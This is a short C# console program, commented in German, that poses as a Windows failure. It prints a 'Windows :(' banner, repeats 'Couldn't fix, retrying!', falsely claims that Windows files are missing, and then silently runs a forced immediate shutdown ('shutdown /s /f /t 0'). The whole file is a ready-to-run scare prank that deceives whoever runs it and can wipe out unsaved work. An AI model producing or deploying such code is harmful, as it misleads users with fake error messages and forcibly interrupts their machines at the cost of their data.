using System;
using System.Diagnostics;
using System.Threading;

class Program
{
    static void Main()
    {
        // ASCII-Art
        string asciiArt = @"
 __        ___           _                                   __
 \ \      / (_)_ __   __| | _____      _____            _   / /
  \ \ /\ / /| | '_ \ / _` |/ _ \ \ /\ / / __|          (_) | | 
   \ V  V / | | | | | (_| | (_) \ V  V /\__ \           _  | | 
    \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/          (_) | | 
                                                            \_\
";
        Console.WriteLine(asciiArt);

        // "Couldn't fix, retrying!" 7 Mal wiederholen
        for (int i = 0; i < 7; i++)
        {
            Console.WriteLine("Couldn't fix, retrying!");
            Thread.Sleep(1000); // Warte 1 Sekunde zwischen den Meldungen
        }

        // Abschaltmeldung
        Console.WriteLine("Windows files are missing. Your PC is shutting down now!");
        Thread.Sleep(2000); // Warte 2 Sekunden

        // PC herunterfahren
        ShutdownPC();
    }

    static void ShutdownPC()
    {
        // Führe den Shutdown-Befehl aus
        Process.Start(new ProcessStartInfo("shutdown", "/s /f /t 0")
        {
            CreateNoWindow = true,
            UseShellExecute = false
        });
    }
}
